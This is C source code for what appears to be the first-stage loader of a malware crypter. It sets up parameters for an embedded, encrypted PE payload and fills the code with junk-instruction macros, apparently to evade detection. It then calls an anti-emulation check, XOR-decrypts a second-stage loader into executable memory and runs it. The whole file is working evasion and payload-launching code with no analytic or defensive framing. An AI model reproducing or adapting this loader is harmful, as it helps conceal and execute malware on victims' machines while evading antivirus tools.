
#include "loader1.h"
#include "pragma.h"
#include "import.h"
#include "data.h"

int WinMain(void *hInstance, void *hPrevInstance, void *lpCmdLine, int nCmdShow)
{
	struct params_cb params;
	char *loader2_data;
	void *h_module;
	int i;

	PT_TRASH(nCmdShow);
	params.h_instance = hInstance;
	params.is_resource = DATA_IS_RESOURCE;
	PT_TRASH(nCmdShow);
	params.is_base64 = DATA_IS_BASE64;
	params.is_packed = DATA_IS_PACKED;
	PT_TRASH(nCmdShow);
	params.p_pe_data_1 = pe_data_1;
	params.p_pe_data_2 = pe_data_2;
	PT_TRASH(nCmdShow);
	params.pe_data_size_1 = sizeof(pe_data_1);
	params.pe_data_size_2 = sizeof(pe_data_2);
	PT_TRASH(nCmdShow);
	params.depacked_data_length = DEPACKED_DATA_LEN;
	params.p_decryption_key = decryption_key;

	PT_TRASH(nCmdShow);
	loader2_data = VirtualAlloc(0, sizeof(dc2_code), 12288, 64);

	PT_TRASH(nCmdShow);
	h_module = LoadLibraryA(ANTIEMUL_LIB);

	PT_TRASH(nCmdShow);
    fnANTIEMUL = GetProcAddress(h_module, ANTIEMUL_FUNC);

    PT_TRASH(nCmdShow);
	if (ANTIEMUL())
	{
		PT_TRASH(nCmdShow);
		for (i = 0; i < sizeof(dc2_code); i++)
		{
			loader2_data[i] = dc2_code[i] ^ decryption_key[i % sizeof(decryption_key)];
		}
	}

	PT_TRASH(nCmdShow);
	loader2 = loader2_data;
	PT_TRASH(nCmdShow);
	loader2(&params);
	PT_TRASH(nCmdShow);
}